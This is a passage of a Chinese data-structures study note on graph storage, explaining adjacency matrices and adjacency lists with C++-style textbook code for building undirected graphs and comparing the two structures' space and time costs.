class="line">}AMGraph;</span><br></pre></td></tr></table></figure><p>算法思想：</p><ol><li>输入总顶点数和总边数</li><li>依次输入点的信息存入顶点表中</li><li>初始化邻接矩阵，使每个权值初始化为极大值</li><li>构造邻接矩阵</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">CreateUDN</span><span class="params">(AMGraph &amp;G)</span></span></span><br><span class="line"><span class="function"></span>{<span class="comment">//采用邻接矩阵表示法，创建无向网G</span></span><br><span class="line">    cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum;<span class="comment">//输入总顶点数和总边数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++)</span><br><span class="line">        cin &gt;&gt; G.vexs[i];<span class="comment">//依次输入点的信息</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G.vexnum; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;G.vexnum; j++)</span><br><span class="line">            G.arcs[i][j] = MaxInt;<span class="comment">//初始化邻接矩阵</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>; k&lt;G.vexnum; k++)</span><br><span class="line">    {<span class="comment">//构造邻接矩阵</span></span><br><span class="line">        cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w;<span class="comment">//输入一条边所依附的顶点及边的权值</span></span><br><span class="line">        i = <span class="built_in">LocateVex</span>(G, v1);</span><br><span class="line">        j = <span class="built_in">LocateVex</span>(G, v2);<span class="comment">//确定v1和v2在G中的位置</span></span><br><span class="line">        G.arcs[i][j] = w;<span class="comment">//边&lt;v1,v2&gt;的权值置位w</span></span><br><span class="line">        G.arcs[j][i] = G.arcs[i][j];<span class="comment">//无向图，所以是对称的</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">LocateVex</span><span class="params">(AMGraph G, VertexType u)</span></span></span><br><span class="line"><span class="function"></span>{<span class="comment">//图G中查找顶点u，存在则返回顶点表中的下标；否则返回-1</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G.vexnum; i++)</span><br><span class="line">        <span class="keyword">if</span>(u == G.vexs[i])</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>邻接矩阵存储图的优点：</p><ul><li><p>直观、简单、好理解</p></li><li><p>方便检查一堆顶点间是否存在边</p></li><li><p>方便找任一顶点的所有“邻接点”(有边直接相连的顶点)</p></li><li><p>方便计算任一顶点的“度”(从该点发出的边为“出度”，指向该点的边为“入度”)</p><p>无向图：对应行(或列)非0元素的个数</p><p>有向图：对应行非0元素的个数为“出度”，对应列非0元素的个数为“入度”</p></li></ul><p>缺点：</p><ul><li>不便于增加和删除顶点</li><li>浪费空间——存稀疏图(点很多而边很少)有大量无效元素(<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.832ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 2577.6 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(1152,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(633,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2188.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>)</li><li>浪费时间——统计稀疏图中一共有多少条边(<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.832ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 2577.6 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(1152,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(633,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2188.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>)</li></ul><h4 id="3-2-2-2-邻接表"><a href="#3-2-2-2-邻接表" class="headerlink" title="3.2.2.2 邻接表"></a>3.2.2.2 邻接表</h4><p>顶点：按编号顺序将顶点数据存储在一维数组中。</p><p>关联同一顶点的边(以顶点为尾的弧)：用线性链表存储。</p><p>无向图邻接表的特点：</p><ul><li>邻接表不唯一</li><li>若无向图中有n个顶点、e条边，则其邻接表需n个头结点和2e个表结点。适宜存储稀疏图。空间复杂度O(n+2e)</li><li>无向图中顶点<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.837ex" height="1.359ex" role="img" focusable="false" viewBox="0 -443 812 600.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>的度为第i个单链表中的结点数</li></ul><p>有向图的邻接表的特点：</p><ul><li>顶点<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.837ex" height="1.359ex" role="img" focusable="false" viewBox="0 -443 812 600.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>的出度为第i个单链表中的结点个数</li><li>顶点<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.837ex" height="1.359ex" role="img" focusable="false" viewBox="0 -443 812 600.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>的入度为整个单链表中邻接点域值是i-1的结点个数</li><li>由于找出度容易，找入度难，所以可以弄一个逆邻接表存储入度边</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MVNum 100<span class="comment">//定义最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> VerTexType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span>//边结点</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> adjvex;<span class="comment">//该边所指向的顶点的位置</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> * <span class="title">nextarc</span>;</span><span class="comment">//指向下一条边的指针</span></span><br><span class="line">    OtherInfo info;<span class="comment">//和边相关的信息，权值等</span></span><br><span class="line">}ArcNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VNode</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    VerTexType data;<span class="comment">//顶点信息</span></span><br><span class="line">    ArcNode *firstarc;<span class="comment">//指向第一条依附该顶点的边的指针</span></span><br><span class="line">}VNode, AdjList[MVNum];<span class="comment">//AdjList表示邻接表类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    AdjList vertices;</span><br><span class="line">    <span class="type">int</span> vexnum, arcnum;<span class="comment">//图的当前顶点数和弧数</span></span><br><span class="line">}ALGraph;</span><br></pre></td></tr></table></figure><p>算法思想：</p><ol><li><p>输入总顶点数和总边数</p></li><li><p>建立顶点表</p><p>依次输入点的信息存入顶点表中</p><p>使每个表头结点的指针域初始化为NULL</p></li><li><p>创建邻接表</p><p>依次输入每条边依附的两个顶点</p><p>确定两个顶点的序号i和j，建立边结点</p><p>将此边结点分别插到<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.837ex" height="1.359ex" role="img" focusable="false" viewBox="0 -443 812 600.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>和<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="1.944ex" height="1.668ex" role="img" focusable="false" viewBox="0 -443 859.3 737.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>对应的两个比链表的头部</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">CreateUDG</span><span class="params">(ALGraph &amp;G)</span></span></span><br><span class="line"><span class="function"></span>{<span class="comment">//采用邻接表创建无向图G</span></span><br><span class="line">    cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum;<span class="comment">//输入总顶点数和总边数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++)</span><br><span class="line">    {</span><br><span class="line">        cin &gt;&gt; G.vertices[i].data;<span class="comment">//输入顶点值</span></span><br><span class="line">        G.vertices[i].firstarc = <span class="literal">NULL</span>;<span class="comment">//初始化表头结点的指针域</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>; k&lt;G.arcnum; k++)<span class="comment">//输入各边，构造邻接表</span></span><br><span class="line">    {</span><br><span class="line">        cin &gt;&gt; v1 &gt;&gt; v2;<span class="comment">//输入一条边依附的两个顶点</span></span><br><span class="line">        i = <span class="built_in">LocateVex</span>(G, v1);</span><br><span class="line">        j = <span class="built_in">LOcateVex</span>(G, v2);</span><br><span class="line">        </span><br><span class="line">        p1 = <span class="keyword">new</span> ArcNode;<span class="comment">//生成一个新的边结点p1</span></span><br><span class="line">        p1-&gt;adjvex = j;<span class="comment">//邻接点序号为j</span></span><br><span class="line">        p1-&gt;nextarc = G.vertices[i].firstarc;<span class="comment">//头插法</span></span><br><span class="line">        G.vertices[i].firstarc = p1;<span class="comment">//将新结点p1插入顶点vi的边表头部</span></span><br><span class="line"></span><br><span class="line">        p2 = <span class="keyword">new</span> ArcNode;</span><br><span class="line">        p2-&gt;adjvex = i;</span><br><span class="line">        p2-&gt;nextarc = G.vertices[j].firstarc;</span><br><span class="line">        G.vertices[j].firstarc = p2;<span class="comment">//将新结点p1插入顶点vi的边表头部</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h4 id="3-2-2-3-邻接矩阵和邻接表的关系"><a href="#3-2-2-3-邻接矩阵和邻接表的关系" class="headerlink" title="3.2.2.3 邻接矩阵和邻接表的关系"></a>3.2.2.3 邻接矩阵和邻接表的关系</h4><p>联系：邻接表中每个链表对应于邻接矩阵中的一行，链表中结点个数等于一行中非零元素的个数。</p><p>区别：①对于任一确定的无向图，邻接矩阵是唯一的(行列号与顶点编号一致)，但邻接表不唯一(链接次序与顶点编号无关)；②邻接矩阵的空间复杂度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.832ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 2577.6 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(1152,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(633,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2188.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，而邻接表的空间复杂度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="8.664ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3829.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1974.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2974.4,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(3440.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 